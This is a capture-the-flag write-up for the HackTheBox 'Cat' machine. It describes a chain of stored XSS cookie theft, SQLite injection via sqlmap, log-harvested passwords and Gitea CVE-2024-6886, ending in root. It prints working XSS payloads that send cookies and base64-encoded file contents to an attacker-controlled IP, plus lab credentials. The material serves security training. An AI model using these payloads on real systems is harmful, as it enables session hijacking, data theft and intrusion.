<h1>CAT WRITE UP</h1>

<img width="701" height="377" alt="cat" src="https://github.com/user-attachments/assets/7aef60ee-9262-4f2d-bf1d-da6613990c17" /><br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Medium<br>
<b>Operating System:</b> Linux<br>
<b>IP Address:</b> 10.10.11.53<br>
<b>Hostname:</b> cat.htb<br>
<b>Open Ports:</b> 22/tcp, 80/tcp<br>
<b>Web Server:</b> Apache2 v2.4.41(Ubuntu)<br>
<b>Addition:</b> Gitea<br>

<h2>SUMMARY</h2>

Cat is a medium-difficulty Linux machine that features a custom PHP web application vulnerable to cross-site scripting (XSS). Leveraging this XSS vulnerability, I can perform cookie hijacking to steal an administrator's cookie and elevate my privileges in the application. I can then perform a SQL Injection on a SQLite database to get hashed user credentials. With cracking its hash to gain access as a user who has group membership to read server logs. These logs leak a clear-text password to a user accessing an internally hosted Gitea instance on version 1.22.0, vulnerable to an XSS attack via `CVE-2024-6886` due to improper input sanitization. By exploiting the CVE, I can read a private Gitea repository containing a credential for the root user.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan.

<code>nmap -sC -sV 10.10.11.53</code>

Result:

<img width="769" height="445" alt="ss1" src="https://github.com/user-attachments/assets/c5f5ac7f-d3f9-4dad-bc9c-38037ca063ae" /><br>

As I can see port 22(SSH) and 80(HTTP) are open. Also there is "/.git/" directory. It means I can reach some source codes and files about application.

<b>2-</b> First thing first, visit "10.10.11.53:80".

<img width="1366" height="557" alt="ss2" src="https://github.com/user-attachments/assets/38490bae-cb5c-4f9d-828b-726bc67ced5f" /><br>

In there I see on browser's url section is called "cat.htb". So I add "cat.htb" to my "/etc/hosts".

<code>echo "10.10.11.53	cat.htb" | sudo tee -a /etc/hosts</code>

<b>3-</b> Now visit "http://cat.htb".

<img width="1366" height="489" alt="ss3" src="https://github.com/user-attachments/assets/a53be803-0e9e-463d-9729-e3670fcf6cf7" /><br>

There is a web page about some sort of cat competition. As a functionality I can register and login to the system, after that "Contest" part opens and I can give information about my cat.

<img width="1366" height="688" alt="ss4" src="https://github.com/user-attachments/assets/b588c159-cc0e-4a77-8313-cc21f0f6e2a3" /><br>

<b>4-</b> Now I visit "http://cat.htb/.git/".

<img width="1366" height="238" alt="ss5" src="https://github.com/user-attachments/assets/8436b092-9e13-4960-9a3e-0aa83498361a" /><br>

I dont have permission to see git files but I start directory enumeration to be sure.

<code>gobuster dir -u http://cat.htb/.git/ -w ~/Desktop/HTB/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt</code>

Result:

<img width="1036" height="448" alt="ss6" src="https://github.com/user-attachments/assets/8ca8d61c-1db8-4d5d-b270-8e1fb8706712" /><br>

<b>5-</b> According to this result I visit "/HEAD" directory.

<img width="1366" height="219" alt="ss7" src="https://github.com/user-attachments/assets/76780e0a-1130-4e71-b8cd-e5c028c64ce6" /><br>

From now on i dump this git files with "git-dumper".

<b>6-</b> I run "git-dumper".

<code>mkdir cat_git_files</code>

<code>git-dumper http://cat.htb/.git ./cat_git_files</code>

Result:

<img width="852" height="56" alt="ss8" src="https://github.com/user-attachments/assets/955d3b1a-e355-4570-b5ec-13b168a5d89e" /><br>

<b>7-</b> First in "join.php" register function there is no filter for username input. That means I can inject any special characters as username value when I register.

<img width="608" height="100" alt="ss9" src="https://github.com/user-attachments/assets/4787dc2b-0268-4c9b-9fe7-e104adb8a6f6" /><br>

This vulnerable input can lead me to Stored XSS in "view_cat.php".

<img width="862" height="201" alt="ss10" src="https://github.com/user-attachments/assets/35d95990-242a-46e1-8265-3143a75baf79" /><br>

As I can see, my username value reflected here without any sanitazing. So I can execute XSS in here.

<b>8-</b> Second in "accept_cat.php" as "catName" value send in to "cat_name" parameter and without any sanitazing using in SQL query.

<img width="575" height="57" alt="ss11" src="https://github.com/user-attachments/assets/25bb9879-9722-426b-ab70-40d40bc29678" /><br>

This can lead me to SQL Injection when I need it.

<b>9-</b> Run http server via php.

<code>php -S 0.0.0.0:8000</code>

I start waiting request to my http server with cookie value in it.

<b>10-</b> After that I register the system with XSS payload as my username value.

My payload= &lt;script&gt;fetch('http://10.10.14.106:8000/?cookie=' + document.cookie);&lt;/script&gt;

<img width="639" height="520" alt="ss12" src="https://github.com/user-attachments/assets/4f5bdd6f-da3c-4b49-bc6c-4eaf51383658" /><br>

And login the system.

<img width="599" height="366" alt="ss13" src="https://github.com/user-attachments/assets/5846f5f8-c5ba-4df6-9eab-a65936d36a7f" /><br>

<b>11-</b> Now I just send cat information for admin's approval.

<img width="639" height="563" alt="ss14" src="https://github.com/user-attachments/assets/fc4695d3-7bc1-42df-ac0c-32c4c3ba066a" /><br>

From now on I just wait to get request on my http server start earlier.

<b>12-</b> And I get request with cookie value from the system.

<img width="1050" height="100" alt="ss15" src="https://github.com/user-attachments/assets/5dee7ca8-0127-4512-a84a-ab41f2f22d37" /><br>

I got admin user's session cookie. From now on I can reach admin functions with this cookie.

<b>13-</b> From my earlier code views, I know in "accept_cat.php" there will be SQL Injection. So I start "sqlmap" to exploit that injection.

<code>sqlmap --cookie="PHPSESSID=2h6l4kou08tjp8rc90hik973c9" -u "http://cat.htb/accept_cat.php" --data "catId=3&catName=test" -p catName --level 5 --risk 3 --dbms=SQLite --technique=B -T "users" -threads=4 --dump</code>

There it is, I know table name from source codes and again I know what kind of dbms they are using from config files.

Result:

<img width="1292" height="306" alt="ss16" src="https://github.com/user-attachments/assets/15d041f3-cf55-46f8-aa8a-734f47196a35" /><br>

I can see all users registered in the system.

<b>14-</b> Now I got a bunch of username and hashed password datas. I try to crack hash one by one with "crackstation.net".

Result:

<img width="1366" height="658" alt="ss17" src="https://github.com/user-attachments/assets/651f02b7-72f7-4a9e-b4af-a0ba209b0e87" /><br>

There is only "rosa" user's password value cracked with application.

username= rosa
password= soyunaprincesarosa

<b>15-</b> Let's try ssh connection with these credentials.

<code>ssh rosa@cat.htb</code>

Result:

<img width="970" height="633" alt="ss18" src="https://github.com/user-attachments/assets/19299d4e-8921-4d1d-b852-7f0b285b5f54" /><br>

Yes, I got ssh connection to target machine.

<b>16-</b> First I check "rosa" user's id output.

<code>id</code>

Result:

<img width="446" height="34" alt="ss19" src="https://github.com/user-attachments/assets/89876a43-ca6a-4049-adcb-0b4b29246010" /><br>

There I see a group named as "adm". So I start research about adm group permissions.

<code>find / -group adm 2>/dev/null</code>

Result:

<img width="424" height="635" alt="ss20" src="https://github.com/user-attachments/assets/58cc41d1-6e68-4e2f-b090-817d1d4d940c" /><br>

In this output most important data is in "/var/log/apache2" file.

<b>17-</b> As I know from source code "axel" user is the admin in application. I need password belongs to axel. Luckly, I can access web application's logs.

<code>grep axel /var/log/apache2 -R</code>

Result:

<img width="1359" height="274" alt="ss21" src="https://github.com/user-attachments/assets/f73a4078-27b6-4298-a681-d98257b58231" /><br>

And yes I got "axel" user's password as "aNdZwgC4tI9gnVXv_e3Q".

username= axel
password= aNdZwgC4tI9gnVXv_e3Q

<b>18-</b> Now, try ssh connection as axel user.

<code>ssh axel@cat.htb</code>

Result:

<img width="838" height="550" alt="ss22" src="https://github.com/user-attachments/assets/f7c5476e-dd8b-4704-b6fa-988cab6f2a2f" /><br>

And this is how I get user flag!!!

<b>19-</b> After I logged in as "axel" there is a notification like "You have mail.".

<img width="950" height="583" alt="ss23" src="https://github.com/user-attachments/assets/e00946e2-7107-4d56-808a-8da4aa4b5fd3" /><br>

<b>20-</b> I read "axel" user's mails.

<code>cat /var/mail/axel</code>

Result:

<img width="1366" height="632" alt="ss24" src="https://github.com/user-attachments/assets/4d245e63-d964-4714-95aa-04f005871f8a" />
<br>

<b>21-</b> Because second mail mentioned localhost:3000, I decide to look target machine's local ports.

<code>netstat -tuln</code>

Result:

<img width="612" height="229" alt="ss25" src="https://github.com/user-attachments/assets/f1e82160-ac64-45bb-aac0-bcee9f430031" /><br>

It confirmed port 3000 open and listening state.

<b>22-</b> Start ssh connection with ssh forwarding on port 3000.

<code>ssh -L 3000:127.0.0.1:3000 axel@cat.htb</code>

And visit "http://localhost:3000" on my browser.

Result:

<img width="1366" height="687" alt="ss26" src="https://github.com/user-attachments/assets/4722ddf0-aa44-4b44-9a1b-3fd3245e009a" /><br>

Gitea server welcomes me.

<b>23-</b> Most important part is version number for this gitea server.

<img width="393" height="32" alt="ss27" src="https://github.com/user-attachments/assets/d4f86b57-5b08-4d66-9a1b-eed4c02b939a" /><br>

When I research about this version number, I find some vulnerability to exploit. Here is the <a href="https://www.exploit-db.com/exploits/52077">CVE-2024-6886</a>

<b>24-</b> I sign in as axel user which I already know the credentials. According to the CVE, I create new repository and add my payload in description field.

Payload= &lt;a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.106:4545/?content="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'&gt;XSS fnwn&lt;/a&gt;

<img width="798" height="535" alt="ss28" src="https://github.com/user-attachments/assets/513d9790-a8ce-46ae-bfca-998a1998e94e" /><br>

My idea is to get "index.php" source code as root user, maybe I'll get some information from there.

<b>25-</b> On my machine start http server for listening.

<code>python3 -m http.server 4545</code>

If everything works I want to see request on my http server.

<b>26-</b> Before sending a mail to "jobert" user, I must give something for it to visit. So for that I create new file in repository which I created.

<b>27-</b> Back to the target machine and send mail as "axel" user to "jobert" user to visit my vulnerable repository.

<code>echo "http://localhost:3000/axel/fnwn" | sendmail jobert@localhost</code>

Result:

<img width="1353" height="119" alt="ss29" src="https://github.com/user-attachments/assets/d33aeace-baa5-4633-8539-427be3170899" /><br>

Now I need to decode this base64 output.

<b>28-</b> To decode this

<code>echo "PD9waHAKJHZhbGlkX3VzZXJuYW1lID0gJ2FkbWluJzsKJHZhbGlkX3Bhc3N3b3JkID0gJ0lLdzc1ZVIwTVI3Q01JeGhIMCc7CgppZiAoIWlzc2V0KCRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10pIHx8ICFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwgCiAgICAkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddICE9ICR2YWxpZF91c2VybmFtZSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkdmFsaWRfcGFzc3dvcmQpIHsKICAgIAogICAgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iRW1wbG95ZWUgTWFuYWdlbWVudCInKTsKICAgIGhlYWRlcignSFRUUC8xLjAgNDAxIFVuYXV0aG9yaXplZCcpOwogICAgZXhpdDsKfQoKaGVhZGVyKCdMb2NhdGlvbjogZGFzaGJvYXJkLnBocCcpOwpleGl0Owo%2FPgoK" | base64 -d</code>

Result:

<img width="1355" height="288" alt="ss30" src="https://github.com/user-attachments/assets/baf80c46-189c-4b0e-862c-97ed1f225c76" /><br>

Now I got root user password.

Password= IKw75eR0MR7CMIxhH0

<b>29-</b> Change user "axel" to "root".

<code>su root</code>

Result:

<img width="248" height="101" alt="ss31" src="https://github.com/user-attachments/assets/65eeca83-22a8-4d02-b2d1-9e9caa79155f" /><br>

And this is how I get root flag!!!

<h2>RESOURCE</h2>
<ul>
<li><a href="https://www.exploit-db.com/exploits/52077">CVE-2024-6886</a></li>
</ul>
